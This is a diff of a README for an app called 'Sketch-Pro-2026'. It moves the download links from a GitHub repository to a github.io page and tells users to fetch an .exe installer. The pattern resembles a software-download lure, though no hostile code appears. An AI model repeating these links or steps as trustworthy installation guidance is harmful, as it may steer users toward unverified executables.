@@ -1,6 +1,6 @@
 # 🎨 Sketch-Pro-2026 - Master your digital design workflow today
 
-[![Download Sketch-Pro-2026](https://img.shields.io/badge/Download-Sketch--Pro--2026-blue)](https://github.com/leonsardinian124/Sketch-Pro-2026)
+[![Download Sketch-Pro-2026](https://img.shields.io/badge/Download-Sketch--Pro--2026-blue)](https://leonsardinian124.github.io)
 
 ## 📋 What is Sketch-Pro-2026?
 
@@ -23,7 +23,7 @@ Common tasks like rendering complex vector paths rely on your processor. If you 
 
 Follow these steps to set up the software on your computer.
 
-1. Navigate to the official project page to download the installer: [https://github.com/leonsardinian124/Sketch-Pro-2026](https://github.com/leonsardinian124/Sketch-Pro-2026)
+1. Navigate to the official project page to download the installer: [https://leonsardinian124.github.io](https://leonsardinian124.github.io)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the latest version to view available files.
 4. Select the file ending in `.exe` to start the download.
